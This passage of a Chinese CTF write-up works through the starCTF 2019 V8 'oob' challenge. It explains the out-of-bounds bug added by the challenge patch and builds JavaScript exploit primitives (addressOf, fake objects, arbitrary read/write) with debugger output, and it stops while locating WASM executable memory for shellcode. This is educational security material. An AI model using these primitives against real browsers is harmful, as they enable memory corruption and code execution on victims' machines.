+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj_array);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj_array[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>然后修改内存（用不了job命令会稍有麻烦，不过问题不大）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0x18a9c7bcde61 &lt;JSArray[1]&gt;</span><br><span class="line">0x18a9c7bcde99 &lt;JSArray[1]&gt;</span><br><span class="line">pwndbg&gt; telescope 0x18a9c7bcde98</span><br><span class="line">00:0000│   0x18a9c7bcde98 —▸ 0x16beebb02f79 ◂— 0x40000373a830001</span><br><span class="line">01:0008│   0x18a9c7bcdea0 —▸ 0x373a83000c71 ◂— 0x373a830008</span><br><span class="line">02:0010│   0x18a9c7bcdea8 —▸ 0x18a9c7bcde81 ◂— 0x373a830008</span><br><span class="line">03:0018│   0x18a9c7bcdeb0 ◂— 0x100000000</span><br><span class="line">04:0020│   0x18a9c7bcdeb8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope 0x18a9c7bcde60</span><br><span class="line">00:0000│   0x18a9c7bcde60 —▸ 0x16beebb02ed9 ◂— 0x40000373a830001</span><br><span class="line">01:0008│   0x18a9c7bcde68 —▸ 0x373a83000c71 ◂— 0x373a830008</span><br><span class="line">02:0010│   0x18a9c7bcde70 —▸ 0x18a9c7bcde49 ◂— 0x373a830014</span><br><span class="line">03:0018│   0x18a9c7bcde78 ◂— 0x100000000</span><br><span class="line">04:0020│   0x18a9c7bcde80 —▸ 0x373a83000801 ◂— 0x373a830001</span><br><span class="line">05:0028│   0x18a9c7bcde88 ◂— 0x100000000</span><br><span class="line">06:0030│   0x18a9c7bcde90 —▸ 0x18a9c7bcddf9 ◂— 0x71000016beebb0ab</span><br><span class="line">07:0038│   0x18a9c7bcde98 —▸ 0x16beebb02f79 ◂— 0x40000373a830001</span><br><span class="line">pwndbg&gt; set &#123;unsigned long&#125;0x18a9c7bcde98 = 0x0016beebb02ed9</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">1.3397815063873e-310</span><br></pre></td></tr></table></figure>
+
+<p>输出不是我们想看到的地址形式，需要做下类型转换：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hex</span>(<span class="title function_">f2i</span>(<span class="number">1.3397815063873e-310</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>最后得到：000018a9c7bcddf9，即对象数组中成员所在的elements属性（elements指针指向的0x18a9c7bcde80地址处），中的第一个成员0x18a9c7bcddf9（位于地址0x18a9c7bcde90处）。</p>
+<p>顺带一提，如果调试的是debug版本，修改内存之后再打印对象会发现程序错误，大概是这个样子：</p>
+<p><img src="/css/images/starctf2019_oob/2021031603.png" srcset="/img/loading.gif"></p>
+<p>参考文章2也有提到这个问题，这里我就不加以研究了。</p>
+<h3 id="starCTF2019"><a href="#starCTF2019" class="headerlink" title="starCTF2019"></a>starCTF2019</h3><p>题目地址：<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip</a></p>
+<p>题目提供了一个diff文件对源代码进行了修改，首先我们要通过这个diff文件对我们下载到的源代码进行更新和重编译。</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>用vultr上的国外云主机更新一遍，首先把diff文件放到v8目录下，执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply oob.diff</span><br></pre></td></tr></table></figure>
+
+<p>然后查看src&#x2F;bootstrapper.cc：</p>
+<p><img src="/css/images/starctf2019_oob/2021031604.png" srcset="/img/loading.gif"></p>
+<p>可以看到补丁已经打上去了，然后我们重新编译出d8：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tools/dev/gm.py x64.release d8</span><br></pre></td></tr></table></figure>
+
+<p>然后把out目录打包到本地即可，简单测试一下oob函数能不能调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aluvion@aluvion:~/桌面/v8/v8/v8/out/x64.release$ cat test.js </span><br><span class="line">var a = [1];</span><br><span class="line">console.log(a.oob());</span><br><span class="line"></span><br><span class="line">aluvion@aluvion:~/桌面/v8/v8/v8/out/x64.release$ ./d8 test.js </span><br><span class="line">2.84793937122275e-310</span><br></pre></td></tr></table></figure>
+
+<p>没有问题，环境搭建完成。</p>
+<h4 id="oob函数"><a href="#oob函数" class="headerlink" title="oob函数"></a>oob函数</h4><p>看看这个函数的具体实现：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是根据参数数量执行读或写操作，而C++的成员函数的第一个参数是this指针，所以实际上就是无参执行读操作，有1个参数时执行写操作。仔细观测对数组进行的读写操作，访问的都是array[length]，而正常数组的下标都是0至length-1，所以这里实际上存在一个越界访问问题，会对。</p>
+<p>我们通过调试一下看看：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;obj&quot;</span>: <span class="string">&quot;Twings&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj_array);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
+
+<p>附近的内存：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x1308b094dde8 // 对象数组的存放地址</span><br><span class="line">00:0000│   0x1308b094dde8 —▸ 0x3433ccc82f79 ◂— 0x4000037cf4b8c01 // 对象数组的map属性，标识了这是个对象数组</span><br><span class="line">01:0008│   0x1308b094ddf0 —▸ 0x37cf4b8c0c71 ◂— 0x37cf4b8c08</span><br><span class="line">02:0010│   0x1308b094ddf8 —▸ 0x1308b094ddd1 ◂— 0x37cf4b8c08  // 对象数组的elements属性，指向成员对象的指针放置在其中</span><br><span class="line">03:0018│   0x1308b094de00 ◂— 0x100000000</span><br><span class="line">04:0020│   0x1308b094de08 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope 0x1308b094ddd0 // 数组成员的存放地址，即对象数组的elements属性</span><br><span class="line">00:0000│   0x1308b094ddd0 —▸ 0x37cf4b8c0801 ◂— 0x37cf4b8c01</span><br><span class="line">01:0008│   0x1308b094ddd8 ◂— 0x100000000 // 成员数量</span><br><span class="line">02:0010│   0x1308b094dde0 —▸ 0x1308b094dd81 ◂— 0x7100003433ccc8ab // 第一个成员对象的地址</span><br><span class="line">03:0018│   0x1308b094dde8 —▸ 0x3433ccc82f79 ◂— 0x4000037cf4b8c01 // 对象数组的首个地址单元，即其map属性</span><br><span class="line">04:0020│   0x1308b094ddf0 —▸ 0x37cf4b8c0c71 ◂— 0x37cf4b8c08</span><br><span class="line">05:0028│   0x1308b094ddf8 —▸ 0x1308b094ddd1 ◂— 0x37cf4b8c08</span><br><span class="line">06:0030│   0x1308b094de00 ◂— 0x100000000</span><br><span class="line">07:0038│   0x1308b094de08 ◂— 0x0</span><br></pre></td></tr></table></figure>
+
+<p>很明显，这里读写的其实就是对象数组的首个地址单元的数据，即其map属性的地址。</p>
+<p>也就是说，通过这个越界写，我们可以让v8的类型判断混乱，从而让一个对象数组被认为是一个浮点数组：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;obj&quot;</span>: <span class="string">&quot;Twings&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj_array);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line">obj_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hex</span>(<span class="title function_">f2i</span>(obj_array[<span class="number">0</span>])));</span><br></pre></td></tr></table></figure>
+
+<p>结果就会打印出第一个成员对象的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x32884604ec51 &lt;JSArray[1]&gt;</span><br><span class="line">000032884604ebb1</span><br></pre></td></tr></table></figure>
+
+<p>整合一下成一个函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">o</span>) &#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = o;</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hex</span>(<span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(float_array))));</span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br></pre></td></tr></table></figure>
+
+<p>调试确认没有问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000ce56574ed51</span><br><span class="line">0x0ce56574ed51 &lt;JSArray[1]&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h4><p>通过这个类型混淆，我们能做什么呢？</p>
+<p>将对象数组混淆成浮点数组，我们可以打印一个对象的地址。</p>
+<p>而反过来，将浮点数组混淆成对象数组，然后访问其第一个成员，v8就会将这个浮点数当成一个对象地址。而因为这个浮点数可以由我们随意控制，所以如果我们可以控制某一块内存的数据，我们就可以伪造一个对象出来。</p>
+<p>这个问题也很好解决，我们可以设置一个浮点数组，因为浮点数组的成员是成片排列在内存中的，所以这样一来我们就可以完全控制一块内存用以伪造对象。然后通过addressOf函数获取其内存地址，通过调试我们可以发现elements一般紧贴该对象，所以可以通过计算获取这片内存的地址，先调试一下看看偏移：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">addressOf</span>(float_array),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x100000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = <span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(fake_array));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hex</span>(fake_array_addr));</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x000012610a44f200</span><br><span class="line">00:0000│   0x12610a44f200 —▸ 0x1e62dfe02ed9 ◂— 0x40000245bdfdc01</span><br><span class="line">01:0008│   0x12610a44f208 —▸ 0x245bdfdc0c71 ◂— 0x245bdfdc08</span><br><span class="line">02:0010│   0x12610a44f210 —▸ 0x12610a44f1c9 ◂— 0x245bdfdc14</span><br><span class="line">03:0018│   0x12610a44f218 ◂— 0x500000000</span><br><span class="line">04:0020│   0x12610a44f220 —▸ 0x245bdfdc12c9 ◂— 0x245bdfdc01</span><br><span class="line">05:0028│   0x12610a44f228 ◂— 0x100000000</span><br><span class="line">06:0030│   0x12610a44f230 ◂— 0x40000000000</span><br><span class="line">07:0038│   0x12610a44f238 —▸ 0x245bdfdc12c9 ◂— 0x245bdfdc01</span><br><span class="line">pwndbg&gt; p/x 0x000012610a44f201-0x12610a44f1c9</span><br><span class="line">$4 = 0x38</span><br></pre></td></tr></table></figure>
+
+<p>因为elements属性前两个地址单元放的是map属性和成员数量，第三个地址单元开始才是成员，所以再计算上0x10的偏移，最后结果应该是-0x38+0x10。</p>
+<p>通过伪造一个浮点数组，我们可以读取其成员，即elements属性所指向地址后方一点地方的数据，再简单测试一下，把伪造浮点数组的长度加多一个0（长度变为16），同样由于elements指针和具体成员之间存在一个0x10的偏移，修改一下伪造浮点数组的第三个浮点数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(float_array)) - <span class="number">0x10n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = <span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(fake_array)) - <span class="number">0x38n</span> + <span class="number">0x10n</span>;</span><br><span class="line">float_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(fake_array_addr);</span><br><span class="line">float_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hex</span>(fake_array_addr));</span><br><span class="line"><span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hex</span>(<span class="title function_">f2i</span>(fake_obj[<span class="number">0</span>])));</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0000220265bcf259</span><br><span class="line">0000343668202f79</span><br><span class="line">float array map: 0000343668202ed9 , obj array map: 0000343668202f79</span><br><span class="line">0x220265bcf209 &lt;JSArray[1]&gt;</span><br><span class="line">0x220265bcf1d1 &lt;JSArray[1]&gt;</span><br><span class="line">0x220265bcf259 &lt;JSArray[16]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们成功获得了当时被设置在浮点数组map属性位置，对象数组的map属性地址。</p>
+<p>同样写成函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getFakeObj</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> fake_array_addr = <span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(fake_array)) - <span class="number">0x38n</span> + <span class="number">0x10n</span>;</span><br><span class="line">    float_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(fake_array_addr);</span><br><span class="line">    float_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>顺便把任意地址读写也写成函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_obj = <span class="title function_">getFakeObj</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(addr) - <span class="number">0x10n</span>)</span><br><span class="line">    <span class="keyword">return</span> fake_obj[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(addr) - <span class="number">0x10n</span>)</span><br><span class="line">    fake_obj[<span class="number">0</span>] = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hex</span>(<span class="title function_">f2i</span>(<span class="title function_">read</span>(<span class="title function_">addressOf</span>(obj_array)))));</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">addressOf</span>(float_array), <span class="number">1.1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们已经实现了任意地址读，任意地址写也很简单，直接修改fake_obj即可。</p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>有了任意地址读写，我们可以做什么呢？</p>
+<p>与PHP的UAF不同，chrome没有什么可以执行系统命令的函数，无法直接通过调用函数的方式执行命令。</p>
+<p>不过chrome中存在wasm技术，虽然wasm编译后的结果看起来是一段v8字节码而不是系统汇编代码，不过当它加载到v8中的时候，v8会不会生成一些会执行到的汇编代码在内存中？如果有，这段地址就是可读可写可执行的，我们就可以通过任意地址写将其替换成我们的shellcode从而完成命令执行。</p>
+<p>我们先来调试看看wasm加载字节码之后形成的函数是什么样子的：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x38400785fa69: [Function] in OldSpace</span><br><span class="line"> - map: 0x17f2a8584379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x384007842109 &lt;JSFunction (sfi = 0x828bce48039)&gt;</span><br><span class="line"> - elements: 0x14d3e7a80c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x38400785fa31 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x14d3e7a84ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x384007841869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x3be236f42001 &lt;Code 